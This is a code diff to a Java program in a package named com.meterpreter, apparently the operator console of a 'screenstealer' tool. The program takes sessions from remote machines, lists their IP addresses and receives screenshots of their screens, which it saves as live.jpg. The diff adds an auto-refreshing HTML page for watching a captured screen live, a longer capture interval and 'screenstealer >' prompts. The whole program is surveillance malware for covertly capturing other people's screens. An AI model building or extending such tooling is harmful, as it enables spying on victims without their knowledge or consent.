@@ -2,6 +2,7 @@ package com.meterpreter;
 
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
+import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -15,7 +16,8 @@ import java.util.List;
 abstract class pRes {
 
 	public static final String IMG_NAME = "live.jpg";
-	public static final int INTERVAL = 200;
+	public static final String HTML_NAME = "live.html";
+	public static final int INTERVAL = 500;
 
 	public static List<Session> sessionList;
 
@@ -43,7 +45,34 @@ class Commander {
 
 	public Commander() {
 		br = new BufferedReader(new InputStreamReader(System.in));
-		
+		try {
+			File img = new File(pRes.IMG_NAME);
+			if(!img.exists())
+				img.createNewFile();
+			
+			File file = new File(pRes.HTML_NAME);
+			if(!file.exists())
+				file.createNewFile();
+			FileOutputStream fos = new FileOutputStream(pRes.HTML_NAME);
+			String html = 
+					"<!DOCTYPE html>\n" + 
+					"<html>\n" + 
+					"<head>\n" + 
+					"	<meta http-equiv=\"refresh\" content=\"0.5\">\n" + 
+					"	<title>	Live view</title>\n" + 
+					"</head>\n" + 
+					"<body>\n" + 
+					"<img src=\"file://" + 
+					img.getAbsolutePath() + 
+					"\">" +
+					"</body>\n" + 
+					"</html>\n" + 
+					"";
+			fos.write(html.getBytes());
+			fos.close();
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
 	}
 
 	public void command(DataOutputStream dos) {
@@ -56,6 +85,7 @@ class Commander {
 					Thread.sleep(pRes.INTERVAL);
 				} catch (Exception e) {
 					System.out.println("Stealing was interrupted.");
+					System.out.print("\nscreenstealer > ");
 					break;
 				}
 			}
@@ -124,6 +154,7 @@ class Session implements Runnable {
 			ois = new ObjectInputStream(sessionSocket.getInputStream());
 			ip = sessionSocket.getInetAddress().getHostAddress();
 			System.out.println("\nNew Session connected : " + ip);
+			System.out.print("\nscreenstealer > ");
 
 			synchronized (pRes.sessionList) {
 				pRes.sessionList.add(this);
@@ -144,6 +175,7 @@ class Session implements Runnable {
 				receiver.update();
 			} catch (Exception sessionClosed) {
 				System.out.println("Session lost : " + ip);
+				System.out.print("\nscreenstealer > ");
 
 				synchronized (pRes.sessionList) {
 					pRes.sessionList.remove(this);
@@ -194,7 +226,7 @@ class IO {
 					}
 					System.out.println();
 					System.out.println("No          IP");
-					System.out.println("---------------");
+					System.out.println("-----------------------");
 					for (int i = 0; i < pRes.sessionList.size(); ++i)
 						System.out.println(i + 1 + "        " + pRes.sessionList.get(i).getIp());
 					break;
